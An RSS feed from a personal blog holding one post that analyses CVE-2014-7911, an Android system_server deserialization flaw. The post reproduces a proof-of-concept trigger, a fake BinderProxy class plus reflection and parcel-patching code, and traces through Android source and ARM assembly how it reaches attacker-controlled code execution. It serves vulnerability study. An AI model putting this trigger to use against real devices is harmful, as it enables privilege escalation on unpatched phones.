<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Android on Zeqi&#39;s Blog</title>
    <link>https://zeqiii.github.io/topics/android/</link>
    <description>Recent content in Android on Zeqi&#39;s Blog</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-EN</language>
    <managingEditor>zeqiii@163.com (zeqi)</managingEditor>
    <webMaster>zeqiii@163.com (zeqi)</webMaster>
    <copyright>(c) 2016 zeqi</copyright>
    <lastBuildDate>Mon, 29 Feb 2016 16:34:11 +0800</lastBuildDate>
    <atom:link href="https://zeqiii.github.io/topics/android/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>Analysis of cve-2014-7911</title>
      <link>https://zeqiii.github.io/2016/02/29/analysis-of-cve-2014-7911/</link>
      <pubDate>Mon, 29 Feb 2016 16:34:11 +0800</pubDate>
      <author>zeqiii@163.com (zeqi)</author>
      <guid>https://zeqiii.github.io/2016/02/29/analysis-of-cve-2014-7911/</guid>
      <description>

&lt;h2 id=&#34;a-brief-look&#34;&gt;A brief look&lt;/h2&gt;

&lt;p&gt;System_server is a process has &lt;strong&gt;system&lt;/strong&gt; permission, to which one can send any serializable data. Although system_server won&amp;rsquo;t invoke any functions of the received objected, but &lt;code&gt;finalize&lt;/code&gt; will be called when &lt;strong&gt;GC&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Function &lt;code&gt;finalize&lt;/code&gt; in &lt;code&gt;android.os.BinderProxy&lt;/code&gt; calls a native function which has pointers, the pointers may be controlled by attackers. So &lt;strong&gt;GC&lt;/strong&gt; may result in arbitrary code execution. &lt;code&gt;android.os.BinderProxy&lt;/code&gt; isn&amp;rsquo;t serializable, however, java.io.ObjectInputStream doesn&amp;rsquo;t check whether an object really is serializable, attackers can craft a fake BinderProxy to acheive the goals.
As other one&amp;rsquo;s blog says:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;ObjectInputStream doesn&amp;rsquo;t validate that the serialized object&amp;rsquo;s class type, as described in the serialized object, is actually serializable. It creates an instance of the wanted class anyway with the deserialized values of the object. Therefore, one can create object of any class, and control its private variables, by serializing objects from another class, that would be deserialized as data members of the wanted class.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&#34;poc&#34;&gt;POC&lt;/h2&gt;

&lt;p&gt;Let&amp;rsquo;s just see the POC written by &lt;strong&gt;Jann Horn&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;AAdroid.os.BinderProxy.java&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public class BinderProxy implements Serializable {
   private static final long serialVersionUID = 0;
   //public long mObject = 0x1337beef;
   //public long mOrgue = 0x1337beef;
   private int mObject = 0x1337beef;
   private int mOrgue = 0x1337beef;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
&lt;li&gt;Partial code of MainActivity.java&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;// Put the fake BinderProxy object into a Bundle
Bundle b = new Bundle();
AAdroid.os.BinderProxy evilProxy = new AAdroid.os.BinderProxy();
b.putSerializable(&amp;quot;eatthis&amp;quot;, evilProxy);

// Get IUserManager using reflection
Class clIUserManager = Class.forName(&amp;quot;android.os.IUserManager&amp;quot;);
// Get inner class Stub from IUserManager
Class[] umSubclasses = clIUserManager.getDeclaredClasses();
Class clStub = null;
for (Class c: umSubclasses) {
    if (c.getCanonicalName().equals(&amp;quot;android.os.IUserManager.Stub&amp;quot;)) {
        clStub = c;
    }
}
// Get the field &amp;quot;TRANSACTION_setApplicationRestrictions&amp;quot;
Field fTRANSACTION_setApplicationRestrictions = clStub.getDeclaredField(&amp;quot;TRANSACTION_setApplicationRestrictions&amp;quot;);
fTRANSACTION_setApplicationRestrictions.setAccessible(true);
TRANSACTION_setApplicationRestrictions = fTRANSACTION_setApplicationRestrictions.getInt(null);

// Get UserManager
UserManager um = (UserManager) ctx.getSystemService(Context.USER_SERVICE);
// mService is a field of UserManager, its type is IUserManager
Field fService = UserManager.class.getDeclaredField(&amp;quot;mService&amp;quot;);
fService.setAccessible(true);
// Get mService from UserManager
Object proxy = fService.get(um);

// Get Stub.Proxy from clStub
Class[] stSubclasses = clStub.getDeclaredClasses();
clProxy = null;
for (Class c: stSubclasses) {
    if (c.getCanonicalName().equals(&amp;quot;android.os.IUserManager.Stub.Proxy&amp;quot;)) {
        clProxy = c;
    }
}
// Get field mRemote from Proxy
Field fRemote = clProxy.getDeclaredField(&amp;quot;mRemote&amp;quot;);
fRemote.setAccessible(true);
mRemote = (IBinder) fRemote.get(proxy);
UserHandle me = android.os.Process.myUserHandle();

// Triggr it!
setApplicationRestrictions(ctx.getPackageName(), b, me.hashCode());
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
&lt;li&gt;Implementation of setApplicationRestrictions&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;// This function modifies the Bundle, marshalling it, find &amp;quot;AAdr&amp;quot; and changing it to &amp;quot;andr&amp;quot;, so the class description becomes &amp;quot;android.os.BinderProxy&amp;quot;
public void setApplicationRestrictions(java.lang.String packageName, android.os.Bundle restrictions, int userHandle) throws android.os.RemoteException 
{ 
    android.os.Parcel _data = android.os.Parcel.obtain(); 
    android.os.Parcel _reply = android.os.Parcel.obtain(); 
    try { 
        _data.writeInterfaceToken(DESCRIPTOR); 
        _data.writeString(packageName); 
        _data.writeInt(1); 
        restrictions.writeToParcel(_data, 0); 
        _data.writeInt(userHandle); 
        byte[] data = _data.marshall(); 
        for (int i=0; true; i++) { 
            if (data[i] == &#39;A&#39; &amp;amp;&amp;amp; data[i+1] == &#39;A&#39; &amp;amp;&amp;amp; data[i+2] == &#39;d&#39; &amp;amp;&amp;amp; data[i+3] == &#39;r&#39;) { 
                data[i] = &#39;a&#39;; 
                data[i+1] = &#39;n&#39;; 
                break; 
            } 
        } 
        _data.recycle(); 
        _data = Parcel.obtain(); 
        _data.unmarshall(data, 0, data.length); 
        mRemote.transact(TRANSACTION_setApplicationRestrictions, _data, _reply, 0); 
        _reply.readException(); 
    } 
    finally { 
        _reply.recycle(); 
        _data.recycle(); 
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;From the POC we know that a fake object is created and put into a bundle. It&amp;rsquo;s &lt;code&gt;mObject&lt;/code&gt; and &lt;code&gt;mOrgue&lt;/code&gt; is under attacker&amp;rsquo;s controll and can be set to any values. In function &lt;code&gt;setApplicationRestrictions()&lt;/code&gt;, the bundle object is written to a parcel using &lt;code&gt;restrictions.writeToParcel()&lt;/code&gt;. After the parcel marshalled to a byte array, a loop appears to find string &lt;code&gt;AAdr&lt;/code&gt;, and change &lt;code&gt;AA&lt;/code&gt; to &lt;code&gt;an&lt;/code&gt;. Thus, &lt;code&gt;AAdroid.os.BinderProxy&lt;/code&gt; finally becomes &lt;code&gt;android.os.BinderProxy&lt;/code&gt;. When &lt;code&gt;java.io.ObjectInputStream&lt;/code&gt; deserializes this object, a &lt;code&gt;android.os.BinderProxy&lt;/code&gt; object will be created. In this way, attackers can create any object and set the field value as they want.&lt;/p&gt;

&lt;h2 id=&#34;why-binderproxy&#34;&gt;Why BinderProxy?&lt;/h2&gt;

&lt;p&gt;So why attackers choose &lt;code&gt;android.os.BinderProxy&lt;/code&gt;? Here is the source code of it.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;protected void finalize() throws Throwable {
	destroy();
	super.finalize();
	return;
	Exception exception;
	exception;
	super.finalize();
	throw exception;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The &lt;code&gt;finalize()&lt;/code&gt; method will call a native method &lt;code&gt;distroy()&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;static void android_os_BinderProxy_destroy(JNIEnv* env, jobject obj) {
    IBinder* b = (IBinder*)
            env-&amp;gt;GetIntField(obj, gBinderProxyOffsets.mObject);
    DeathRecipientList* drl = (DeathRecipientList*)
            env-&amp;gt;GetIntField(obj, gBinderProxyOffsets.mOrgue);
    LOGDEATH(&amp;quot;Destroying BinderProxy %p: binder=%p drl=%p\n&amp;quot;, obj, b, drl);
    env-&amp;gt;SetIntField(obj, gBinderProxyOffsets.mObject, 0);
    env-&amp;gt;SetIntField(obj, gBinderProxyOffsets.mOrgue, 0);
    drl-&amp;gt;decStrong((void*)javaObjectForIBinder);
    b-&amp;gt;decStrong((void*)javaObjectForIBinder);
    IPCThreadState::self()-&amp;gt;flushCommands();
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In the above method, &lt;code&gt;mOrgue&lt;/code&gt; is regarded as a pointer of &lt;code&gt;DeathRecipientList&lt;/code&gt;, assigned to &lt;code&gt;drl&lt;/code&gt;. Then &lt;code&gt;drl-&amp;gt;decStrong()&lt;/code&gt; is invoked.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;void RefBase::decStrong(const void* id) const {
    weakref_impl* const refs = mRefs;
    refs-&amp;gt;removeStrongRef(id);
    const int32_t c = android_atomic_dec(&amp;amp;refs-&amp;gt;mStrong);
#if PRINT_REFS
    ALOGD(&amp;quot;decStrong of %p from %p: cnt=%d\n&amp;quot;, this, id, c);
#endif
    ALOG_ASSERT(c &amp;gt;= 1, &amp;quot;decStrong() called on %p too many times&amp;quot;, refs);
    if (c == 1) {
        refs-&amp;gt;mBase-&amp;gt;onLastStrongRef(id);
        if ((refs-&amp;gt;mFlags&amp;amp;OBJECT_LIFETIME_MASK) == OBJECT_LIFETIME_STRONG) {
            delete this;
        }
    }
    refs-&amp;gt;decWeak(id);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;According to other&amp;rsquo;s blog, &lt;code&gt;refs-&amp;gt;mBase-&amp;gt;onLastStrongRef(id);&lt;/code&gt; will eventually causes arbitrary code execution. Below is the assembly code sceenshot from &lt;a href=&#34;http://wooyun.org/&#34;&gt;wooyun.org&lt;/a&gt;, attacker controlls r0 (&lt;code&gt;this&lt;/code&gt; pointer).&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zeqiii.github.io/img/cve-2014-7911/assembly.png&#34; alt=&#34;Image of assembly&#34; /&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;weakref_impl* const refs = mRefs;
refs-&amp;gt;removeStrongRef(id);
const int32_t c = android_atomic_dec(&amp;amp;refs-&amp;gt;mStrong);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Transferred to assembly is:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-assembly&#34;&gt;ldr     r4, [r0, #4]   ; attacker controls r0 also r4
mov     r6, r1
mov     r0, r4
blx     &amp;lt;android_atomic_dec ()&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Then&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;if (c == 1) {
	refs-&amp;gt;mBase-&amp;gt;onLastStrongRef(id);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Transferred to assembly is:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-assembly&#34;&gt;cmp     r0, #1
bne.n   d1ea
ldr     r0, [r4, #8]  ; attacker controls r4 also r0
mov     r1, r6
ldr     r3, [r0, #0]  ; attacker controls r0 also r3
ldr     r2, [r3, #12] ; attacker controls r3 also r2
blx     r2            ; execute code pointed by r2
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;If everything goes smoothly, the code pointed by r2 will be executed.&lt;/p&gt;

&lt;h2 id=&#34;key-point-one-how-aadroid-os-binderproxy-becomes-android-os-binderproxy&#34;&gt;Key Point One: How AAdroid.os.BinderProxy Becomes android.os.BinderProxy&lt;/h2&gt;

&lt;p&gt;From the POC, we know the fake object is put into a bundle which is written to a parcel. Using &lt;code&gt;Parcel.marshall()&lt;/code&gt; we get a byte array and modify its content, change &lt;code&gt;AA&lt;/code&gt; to &lt;code&gt;an&lt;/code&gt;. Then &lt;code&gt;unmarshall()&lt;/code&gt; this array to get a new parcel object and send this parcel to system_server.&lt;/p&gt;

&lt;p&gt;Look into android source code, we can find:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Function &lt;code&gt;putSerializable()&lt;/code&gt; puts the fake object into &lt;code&gt;Bundle.mMap&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;writeToParcel()&lt;/code&gt; calls &lt;code&gt;writeArrayMapInternal()&lt;/code&gt;, write the data in &lt;code&gt;mMap&lt;/code&gt; to parcel.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;writeArrayMapInternal()&lt;/code&gt; calls &lt;code&gt;writeValue(Object v)&lt;/code&gt;, write the value of &lt;code&gt;mMap&lt;/code&gt; into parcel. If the value is an instance of &lt;code&gt;Serializable&lt;/code&gt;, it calls &lt;code&gt;writeSerializable(Serializable serial)&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;In android 4.4.2, &lt;code&gt;writeSerializable()&lt;/code&gt; is implemented as below.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;    public final void writeSerializable(Serializable s) {
        if (s == null) {
            writeString(null);
            return;
        }
        String name = s.getClass().getName();
        writeString(name);
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        try {
            // Output flat
            ObjectOutputStream oos = new ObjectOutputStream(baos);
            oos.writeObject(s);
            oos.close();
            writeByteArray(baos.toByteArray());
        } catch (IOException ioe) {
            throw new RuntimeException(&amp;quot;Parcelable encountered &amp;quot; +
                &amp;quot;IOException writing serializable object (name = &amp;quot; + name +
                &amp;quot;)&amp;quot;, ioe);
        }
    }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Once system_server receive a parcel object from &lt;code&gt;Stub&lt;/code&gt;, function &lt;code&gt;onTransact()&lt;/code&gt; takes the responsibility for reading data from parcel. So the bundle will be restore by &lt;code&gt;Parcel.readBundle()&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;    public final Bundle readBundle(ClassLoader loader) {
        int length = readInt();
        if (length &amp;lt; 0) {
            if (Bundle.DEBUG) Log.d(TAG, &amp;quot;null bundle: length=&amp;quot; + length);
            return null;
        }
        
        final Bundle bundle = new Bundle(this, length);
        if (loader != null) {
            bundle.setClassLoader(loader);
        }
        return bundle;
    }
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
&lt;li&gt;In Bundle.java&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;    /* package */ Bundle(Parcel parcelledData, int length) {
        readFromParcelInner(parcelledData, length);
    }

    void readFromParcelInner(Parcel parcel, int length) {

        /* zeqi: empty, abnormal parcel handling, omitted */

        // Advance within this Parcel
        int offset = parcel.dataPosition();
        parcel.setDataPosition(offset + length);

        Parcel p = Parcel.obtain();
        p.setDataPosition(0);
        /* zeqi: Get parcel data */
        p.appendFrom(parcel, offset, length);
        if (DEBUG) Log.d(TAG, &amp;quot;Retrieving &amp;quot;  + Integer.toHexString(System.identityHashCode(this))
                + &amp;quot;: &amp;quot; + length + &amp;quot; bundle bytes starting at &amp;quot; + offset);
        p.setDataPosition(0);

        /* zeqi: Init field mParcelledData */
        mParcelledData = p;
        mHasFds = p.hasFileDescriptors();
        mFdsKnown = true;
    }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Fake object is get out by fucntion &lt;code&gt;Bundle.getSerializable()&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;    public Serializable getSerializable(String key) {
        /* zeqi: Read data from mParcelledData to mMap */
        unparcel();
        Object o = mMap.get(key);
        if (o == null) {
            return null;
        }
        try {
            return (Serializable) o;
        } catch (ClassCastException e) {
            typeWarning(key, o, &amp;quot;Serializable&amp;quot;, e);
            return null;
        }
    }

    /* package */ synchronized void unparcel() {
        
        /* zeqi: empty parcel handling, omitted */

        int N = mParcelledData.readInt();
        if (N &amp;lt; 0) {
            return;
        }
        if (mMap == null) {
            mMap = new ArrayMap&amp;lt;String, Object&amp;gt;(N);
        } else {
            mMap.erase();
            mMap.ensureCapacity(N);
        }
        /* zeqi: readArrayMapInternal is correspond to writeArrayMapInternal */
        mParcelledData.readArrayMapInternal(mMap, N, mClassLoader);
        mParcelledData.recycle();
        mParcelledData = null;
    }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;According to the code above, we know &lt;code&gt;mMap&lt;/code&gt; can also be init from &lt;code&gt;mParcelledData&lt;/code&gt; by &lt;code&gt;readArrayMapInternal&lt;/code&gt; which calls &lt;code&gt;Parcel.readValue()&lt;/code&gt;, if it comes with a serializable object, &lt;code&gt;readSerializable()&lt;/code&gt; is called.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;    public final Serializable readSerializable() {
        String name = readString();
        if (name == null) {
            // For some reason we were unable to read the name of the Serializable (either there
            // is nothing left in the Parcel to read, or the next value wasn&#39;t a String), so
            // return null, which indicates that the name wasn&#39;t found in the parcel.
            return null;
        }

        byte[] serializedData = createByteArray();
        ByteArrayInputStream bais = new ByteArrayInputStream(serializedData);
        try {
            ObjectInputStream ois = new ObjectInputStream(bais);
            /* zeqi: Problems exist here */
            return (Serializable) ois.readObject();
        } catch (IOException ioe) {
            throw new RuntimeException(&amp;quot;Parcelable encountered &amp;quot; +
                &amp;quot;IOException reading a Serializable object (name = &amp;quot; + name +
                &amp;quot;)&amp;quot;, ioe);
        } catch (ClassNotFoundException cnfe) {
            throw new RuntimeException(&amp;quot;Parcelable encountered&amp;quot; +
                &amp;quot;ClassNotFoundException reading a Serializable object (name = &amp;quot;
                + name + &amp;quot;)&amp;quot;, cnfe);
        }
    
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;references&#34;&gt;References&lt;/h2&gt;

&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://seclists.org/fulldisclosure/2014/Nov/51&#34;&gt;http://seclists.org/fulldisclosure/2014/Nov/51&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.droidsec.cn/cve-2014-7911%E5%AE%89%E5%8D%93%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&#34;&gt;http://www.droidsec.cn/cve-2014-7911%E5%AE%89%E5%8D%93%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.droidsec.cn/%E5%86%8D%E8%AE%BAcve-2014-7911%E5%AE%89%E5%8D%93%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/&#34;&gt;http://www.droidsec.cn/%E5%86%8D%E8%AE%BAcve-2014-7911%E5%AE%89%E5%8D%93%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://drops.wooyun.org/mobile/6082&#34;&gt;http://drops.wooyun.org/mobile/6082&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
  </channel>
</rss>